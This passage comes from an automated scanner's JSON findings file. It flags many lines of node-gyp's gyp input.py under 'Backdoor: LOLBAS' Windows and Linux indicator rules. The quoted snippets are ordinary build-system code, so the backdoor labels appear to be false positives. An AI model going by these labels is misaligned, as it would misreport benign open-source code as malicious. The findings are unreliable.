                      "text": "                # If this is a subsequent target and it's linkable, don't look any\n                # further for linkable dependencies, as they'll already be linked into\n                # this target linkable.  Always look at dependencies of the initial\n                # target, and always look at dependencies of non-linkables.\n                for dependency in self.dependencies:\n                    dependency._LinkDependenciesInternal(\n                        targets, include_shared_libraries, dependencies, False\n",
                      "markdown": "`                # If this is a subsequent target and it's linkable, don't look any\n                # further for linkable dependencies, as they'll already be linked into\n                # this target linkable.  Always look at dependencies of the initial\n                # target, and always look at dependencies of non-linkables.\n                for dependency in self.dependencies:\n                    dependency._LinkDependenciesInternal(\n                        targets, include_shared_libraries, dependencies, False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1909,
                  "startColumn": 52,
                  "endLine": 1909,
                  "endColumn": 56,
                  "snippet": {
                    "text": "            if initial or not is_linkable:\n                # If this is a subsequent target and it's linkable, don't look any\n                # further for linkable dependencies, as they'll already be linked into\n                # this target linkable.  Always look at dependencies of the initial\n                # target, and always look at dependencies of non-linkables.\n                for dependency in self.dependencies:\n                    dependency._LinkDependenciesInternal(\n",
                    "rendered": {
                      "text": "            if initial or not is_linkable:\n                # If this is a subsequent target and it's linkable, don't look any\n                # further for linkable dependencies, as they'll already be linked into\n                # this target linkable.  Always look at dependencies of the initial\n                # target, and always look at dependencies of non-linkables.\n                for dependency in self.dependencies:\n                    dependency._LinkDependenciesInternal(\n",
                      "markdown": "`            if initial or not is_linkable:\n                # If this is a subsequent target and it's linkable, don't look any\n                # further for linkable dependencies, as they'll already be linked into\n                # this target linkable.  Always look at dependencies of the initial\n                # target, and always look at dependencies of non-linkables.\n                for dependency in self.dependencies:\n                    dependency._LinkDependenciesInternal(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1829,
                  "startColumn": 61,
                  "endLine": 1829,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    into this target.\n\n    This function has a split personality, depending on the setting of\n    |initial|.  Outside callers should always leave |initial| at its default\n    setting.\n\n    When adding a target to the list of dependencies, this function will\n",
                    "rendered": {
                      "text": "    into this target.\n\n    This function has a split personality, depending on the setting of\n    |initial|.  Outside callers should always leave |initial| at its default\n    setting.\n\n    When adding a target to the list of dependencies, this function will\n",
                      "markdown": "`    into this target.\n\n    This function has a split personality, depending on the setting of\n    |initial|.  Outside callers should always leave |initial| at its default\n    setting.\n\n    When adding a target to the list of dependencies, this function will\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1702,
                  "startColumn": 30,
                  "endLine": 1702,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                is_in_degree_zero = True\n                # TODO: We want to check through the\n                # node_dependent.dependencies list but if it's long and we\n                # always start at the beginning, then we get O(n^2) behaviour.\n                for node_dependent_dependency in sorted(\n                    node_dependent.dependencies, key=ExtractNodeRef\n                ):\n",
                    "rendered": {
                      "text": "                is_in_degree_zero = True\n                # TODO: We want to check through the\n                # node_dependent.dependencies list but if it's long and we\n                # always start at the beginning, then we get O(n^2) behaviour.\n                for node_dependent_dependency in sorted(\n                    node_dependent.dependencies, key=ExtractNodeRef\n                ):\n",
                      "markdown": "`                is_in_degree_zero = True\n                # TODO: We want to check through the\n                # node_dependent.dependencies list but if it's long and we\n                # always start at the beginning, then we get O(n^2) behaviour.\n                for node_dependent_dependency in sorted(\n                    node_dependent.dependencies, key=ExtractNodeRef\n                ):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1696,
                  "startColumn": 18,
                  "endLine": 1696,
                  "endColumn": 22,
                  "snippet": {
                    "text": "            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n            # Look at dependents of the node just added to flat_list.  Some of them\n            # may now belong in in_degree_zeros.\n            for node_dependent in sorted(node.dependents, key=ExtractNodeRef):\n                is_in_degree_zero = True\n",
                    "rendered": {
                      "text": "            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n            # Look at dependents of the node just added to flat_list.  Some of them\n            # may now belong in in_degree_zeros.\n            for node_dependent in sorted(node.dependents, key=ExtractNodeRef):\n                is_in_degree_zero = True\n",
                      "markdown": "`            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n            # Look at dependents of the node just added to flat_list.  Some of them\n            # may now belong in in_degree_zeros.\n            for node_dependent in sorted(node.dependents, key=ExtractNodeRef):\n                is_in_degree_zero = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1692,
                  "startColumn": 32,
                  "endLine": 1692,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            # Nodes in in_degree_zeros have no dependencies not in flat_list, so they\n            # can be appended to flat_list.  Take these nodes out of in_degree_zeros\n            # as work progresses, so that the next node to process from the list can\n            # always be accessed at a consistent position.\n            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n",
                    "rendered": {
                      "text": "            # Nodes in in_degree_zeros have no dependencies not in flat_list, so they\n            # can be appended to flat_list.  Take these nodes out of in_degree_zeros\n            # as work progresses, so that the next node to process from the list can\n            # always be accessed at a consistent position.\n            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n",
                      "markdown": "`            # Nodes in in_degree_zeros have no dependencies not in flat_list, so they\n            # can be appended to flat_list.  Take these nodes out of in_degree_zeros\n            # as work progresses, so that the next node to process from the list can\n            # always be accessed at a consistent position.\n            node = in_degree_zeros.pop()\n            flat_list.add(node.ref)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1436,
                  "startColumn": 61,
                  "endLine": 1436,
                  "endColumn": 65,
                  "snippet": {
                    "text": "                )\n        elif type(item) is not int:\n            raise TypeError(\n                \"Unknown type \" + item.__class__.__name__ + \" at index \" + index\n            )\n        index = index + 1\n\n",
                    "rendered": {
                      "text": "                )\n        elif type(item) is not int:\n            raise TypeError(\n                \"Unknown type \" + item.__class__.__name__ + \" at index \" + index\n            )\n        index = index + 1\n\n",
                      "markdown": "`                )\n        elif type(item) is not int:\n            raise TypeError(\n                \"Unknown type \" + item.__class__.__name__ + \" at index \" + index\n            )\n        index = index + 1\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1431,
                  "startColumn": 23,
                  "endLine": 1431,
                  "endColumn": 27,
                  "snippet": {
                    "text": "                    \"Variable expansion in this context permits strings and \"\n                    + \"lists only, found \"\n                    + expanded.__class__.__name__\n                    + \" at \"\n                    + index\n                )\n        elif type(item) is not int:\n",
                    "rendered": {
                      "text": "                    \"Variable expansion in this context permits strings and \"\n                    + \"lists only, found \"\n                    + expanded.__class__.__name__\n                    + \" at \"\n                    + index\n                )\n        elif type(item) is not int:\n",
                      "markdown": "`                    \"Variable expansion in this context permits strings and \"\n                    + \"lists only, found \"\n                    + expanded.__class__.__name__\n                    + \" at \"\n                    + index\n                )\n        elif type(item) is not int:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1242,
                  "startColumn": 13,
                  "endLine": 1242,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        )\n\n        if merge_dict is not None:\n            # Expand variables and nested conditinals in the merge_dict before\n            # merging it.\n            ProcessVariablesAndConditionsInDict(\n                merge_dict, phase, variables, build_file\n",
                    "rendered": {
                      "text": "        )\n\n        if merge_dict is not None:\n            # Expand variables and nested conditinals in the merge_dict before\n            # merging it.\n            ProcessVariablesAndConditionsInDict(\n                merge_dict, phase, variables, build_file\n",
                      "markdown": "`        )\n\n        if merge_dict is not None:\n            # Expand variables and nested conditinals in the merge_dict before\n            # merging it.\n            ProcessVariablesAndConditionsInDict(\n                merge_dict, phase, variables, build_file\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1127,
                  "startColumn": 23,
                  "endLine": 1127,
                  "endColumn": 27,
                  "snippet": {
                    "text": "            conditions_key\n            + \" \"\n            + condition[0]\n            + \" must be at least length 2, not \"\n            + str(len(condition))\n        )\n\n",
                    "rendered": {
                      "text": "            conditions_key\n            + \" \"\n            + condition[0]\n            + \" must be at least length 2, not \"\n            + str(len(condition))\n        )\n\n",
                      "markdown": "`            conditions_key\n            + \" \"\n            + condition[0]\n            + \" must be at least length 2, not \"\n            + str(len(condition))\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1036,
                  "startColumn": 24,
                  "endLine": 1036,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            raise GypError(\n                \"Variable \"\n                + contents\n                + \" must expand to a string or list of strings; \"\n                + \"found a \"\n                + replacement.__class__.__name__\n            )\n",
                    "rendered": {
                      "text": "            raise GypError(\n                \"Variable \"\n                + contents\n                + \" must expand to a string or list of strings; \"\n                + \"found a \"\n                + replacement.__class__.__name__\n            )\n",
                      "markdown": "`            raise GypError(\n                \"Variable \"\n                + contents\n                + \" must expand to a string or list of strings; \"\n                + \"found a \"\n                + replacement.__class__.__name__\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 1022,
                  "startColumn": 32,
                  "endLine": 1022,
                  "endColumn": 40,
                  "snippet": {
                    "text": "                    raise GypError(\n                        \"Variable \"\n                        + contents\n                        + \" must expand to a string or list of strings; \"\n                        + \"list contains a \"\n                        + item.__class__.__name__\n                    )\n",
                    "rendered": {
                      "text": "                    raise GypError(\n                        \"Variable \"\n                        + contents\n                        + \" must expand to a string or list of strings; \"\n                        + \"list contains a \"\n                        + item.__class__.__name__\n                    )\n",
                      "markdown": "`                    raise GypError(\n                        \"Variable \"\n                        + contents\n                        + \" must expand to a string or list of strings; \"\n                        + \"list contains a \"\n                        + item.__class__.__name__\n                    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 869,
                  "startColumn": 53,
                  "endLine": 869,
                  "endColumn": 57,
                  "snippet": {
                    "text": "                build_file_dir = None\n\n        # Support <|(listfile.txt ...) which generates a file\n        # containing items from a gyp list, generated at gyp time.\n        # This works around actions/rules which have more inputs than will\n        # fit on the command line.\n        if file_list:\n",
                    "rendered": {
                      "text": "                build_file_dir = None\n\n        # Support <|(listfile.txt ...) which generates a file\n        # containing items from a gyp list, generated at gyp time.\n        # This works around actions/rules which have more inputs than will\n        # fit on the command line.\n        if file_list:\n",
                      "markdown": "`                build_file_dir = None\n\n        # Support <|(listfile.txt ...) which generates a file\n        # containing items from a gyp list, generated at gyp time.\n        # This works around actions/rules which have more inputs than will\n        # fit on the command line.\n        if file_list:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 842,
                  "startColumn": 24,
                  "endLine": 842,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, variables, build_file)\n\n        # Strip off leading/trailing whitespace so that variable matches are\n",
                    "rendered": {
                      "text": "            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, variables, build_file)\n\n        # Strip off leading/trailing whitespace so that variable matches are\n",
                      "markdown": "`            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, variables, build_file)\n\n        # Strip off leading/trailing whitespace so that variable matches are\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 839,
                  "startColumn": 24,
                  "endLine": 839,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        if file_list:\n            processed_variables = gyp.simple_copy.deepcopy(variables)\n            ProcessListFiltersInDict(contents, processed_variables)\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n",
                    "rendered": {
                      "text": "        if file_list:\n            processed_variables = gyp.simple_copy.deepcopy(variables)\n            ProcessListFiltersInDict(contents, processed_variables)\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n",
                      "markdown": "`        if file_list:\n            processed_variables = gyp.simple_copy.deepcopy(variables)\n            ProcessListFiltersInDict(contents, processed_variables)\n            # Recurse to expand variables in the contents\n            contents = ExpandVariables(contents, phase, processed_variables, build_file)\n        else:\n            # Recurse to expand variables in the contents\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 751,
                  "startColumn": 10,
                  "endLine": 752,
                  "snippet": {
                    "text": "            cmd = [re.sub(\"^cat \", \"type \", cmd[0])] + cmd[1:]\n        else:\n            cmd = re.sub(\"^cat \", \"type \", cmd)\n    return cmd\n\n\nPHASE_EARLY = 0\nPHASE_LATE = 1\n",
                    "rendered": {
                      "text": "            cmd = [re.sub(\"^cat \", \"type \", cmd[0])] + cmd[1:]\n        else:\n            cmd = re.sub(\"^cat \", \"type \", cmd)\n    return cmd\n\n\nPHASE_EARLY = 0\nPHASE_LATE = 1\n",
                      "markdown": "`            cmd = [re.sub(\"^cat \", \"type \", cmd[0])] + cmd[1:]\n        else:\n            cmd = re.sub(\"^cat \", \"type \", cmd)\n    return cmd\n\n\nPHASE_EARLY = 0\nPHASE_LATE = 1\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 750,
                  "startColumn": 11,
                  "endLine": 750,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        if type(cmd) is list:\n            cmd = [re.sub(\"^cat \", \"type \", cmd[0])] + cmd[1:]\n        else:\n            cmd = re.sub(\"^cat \", \"type \", cmd)\n    return cmd\n\n\n",
                    "rendered": {
                      "text": "        if type(cmd) is list:\n            cmd = [re.sub(\"^cat \", \"type \", cmd[0])] + cmd[1:]\n        else:\n            cmd = re.sub(\"^cat \", \"type \", cmd)\n    return cmd\n\n\n",
                      "markdown": "`        if type(cmd) is list:\n            cmd = [re.sub(\"^cat \", \"type \", cmd[0])] + cmd[1:]\n        else:\n            cmd = re.sub(\"^cat \", \"type \", cmd)\n    return cmd\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 748,
                  "startColumn": 11,
                  "endLine": 748,
                  "endColumn": 16,
                  "snippet": {
                    "text": "def FixupPlatformCommand(cmd):\n    if sys.platform == \"win32\":\n        if type(cmd) is list:\n            cmd = [re.sub(\"^cat \", \"type \", cmd[0])] + cmd[1:]\n        else:\n            cmd = re.sub(\"^cat \", \"type \", cmd)\n    return cmd\n",
                    "rendered": {
                      "text": "def FixupPlatformCommand(cmd):\n    if sys.platform == \"win32\":\n        if type(cmd) is list:\n            cmd = [re.sub(\"^cat \", \"type \", cmd[0])] + cmd[1:]\n        else:\n            cmd = re.sub(\"^cat \", \"type \", cmd)\n    return cmd\n",
                      "markdown": "`def FixupPlatformCommand(cmd):\n    if sys.platform == \"win32\":\n        if type(cmd) is list:\n            cmd = [re.sub(\"^cat \", \"type \", cmd[0])] + cmd[1:]\n        else:\n            cmd = re.sub(\"^cat \", \"type \", cmd)\n    return cmd\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 435,
                  "startColumn": 10,
                  "endLine": 435,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    # a second round of toolsets expansion now.\n    ProcessToolsetsInDict(build_file_data)\n\n    # Look at each project's target_defaults dict, and merge settings into\n    # targets.\n    if \"target_defaults\" in build_file_data:\n        if \"targets\" not in build_file_data:\n",
                    "rendered": {
                      "text": "    # a second round of toolsets expansion now.\n    ProcessToolsetsInDict(build_file_data)\n\n    # Look at each project's target_defaults dict, and merge settings into\n    # targets.\n    if \"target_defaults\" in build_file_data:\n        if \"targets\" not in build_file_data:\n",
                      "markdown": "`    # a second round of toolsets expansion now.\n    ProcessToolsetsInDict(build_file_data)\n\n    # Look at each project's target_defaults dict, and merge settings into\n    # targets.\n    if \"target_defaults\" in build_file_data:\n        if \"targets\" not in build_file_data:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 375,
                  "startColumn": 64,
                  "endLine": 375,
                  "endColumn": 68,
                  "snippet": {
                    "text": "    # If depth is set, predefine the DEPTH variable to be a relative path from\n    # this build file's directory to the directory identified by depth.\n    if depth:\n        # TODO(dglazkov) The backslash/forward-slash replacement at the end is a\n        # temporary measure. This should really be addressed by keeping all paths\n        # in POSIX until actual project generation.\n        d = gyp.common.RelativePath(depth, os.path.dirname(build_file_path))\n",
                    "rendered": {
                      "text": "    # If depth is set, predefine the DEPTH variable to be a relative path from\n    # this build file's directory to the directory identified by depth.\n    if depth:\n        # TODO(dglazkov) The backslash/forward-slash replacement at the end is a\n        # temporary measure. This should really be addressed by keeping all paths\n        # in POSIX until actual project generation.\n        d = gyp.common.RelativePath(depth, os.path.dirname(build_file_path))\n",
                      "markdown": "`    # If depth is set, predefine the DEPTH variable to be a relative path from\n    # this build file's directory to the directory identified by depth.\n    if depth:\n        # TODO(dglazkov) The backslash/forward-slash replacement at the end is a\n        # temporary measure. This should really be addressed by keeping all paths\n        # in POSIX until actual project generation.\n        d = gyp.common.RelativePath(depth, os.path.dirname(build_file_path))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 219,
                  "startColumn": 29,
                  "endLine": 219,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        return node.s\n    else:\n        raise TypeError(\n            \"Unknown AST node at key path '\" + \".\".join(keypath) + \"': \" + repr(node)\n        )\n\n\n",
                    "rendered": {
                      "text": "        return node.s\n    else:\n        raise TypeError(\n            \"Unknown AST node at key path '\" + \".\".join(keypath) + \"': \" + repr(node)\n        )\n\n\n",
                      "markdown": "`        return node.s\n    else:\n        raise TypeError(\n            \"Unknown AST node at key path '\" + \".\".join(keypath) + \"': \" + repr(node)\n        )\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 198,
                  "startColumn": 33,
                  "endLine": 198,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                raise GypError(\n                    \"Key '\"\n                    + key\n                    + \"' repeated at level \"\n                    + repr(len(keypath) + 1)\n                    + \" with key path '\"\n                    + \".\".join(keypath)\n",
                    "rendered": {
                      "text": "                raise GypError(\n                    \"Key '\"\n                    + key\n                    + \"' repeated at level \"\n                    + repr(len(keypath) + 1)\n                    + \" with key path '\"\n                    + \".\".join(keypath)\n",
                      "markdown": "`                raise GypError(\n                    \"Key '\"\n                    + key\n                    + \"' repeated at level \"\n                    + repr(len(keypath) + 1)\n                    + \" with key path '\"\n                    + \".\".join(keypath)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 151,
                  "startColumn": 25,
                  "endLine": 151,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  file.  Those keys provide access to dicts whose \"included\" keys contain\n  lists of all other files included by the build file.\n\n  included should be left at its default None value by external callers.  It\n  is used for recursion.\n\n  The returned list will not contain any duplicate entries.  Each build file\n",
                    "rendered": {
                      "text": "  file.  Those keys provide access to dicts whose \"included\" keys contain\n  lists of all other files included by the build file.\n\n  included should be left at its default None value by external callers.  It\n  is used for recursion.\n\n  The returned list will not contain any duplicate entries.  Each build file\n",
                      "markdown": "`  file.  Those keys provide access to dicts whose \"included\" keys contain\n  lists of all other files included by the build file.\n\n  included should be left at its default None value by external callers.  It\n  is used for recursion.\n\n  The returned list will not contain any duplicate entries.  Each build file\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/input.py"
                },
                "region": {
                  "startLine": 3109,
                  "startColumn": 26,
                  "endLine": 3109,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        ValidateRunAsInTarget(target, target_dict, build_file)\n        ValidateActionsInTarget(target, target_dict, build_file)\n\n    # Generators might not expect ints.  Turn them into strs.\n    TurnIntIntoStrInDict(data)\n\n    # TODO(mark): Return |data| for now because the generator needs a list of\n",
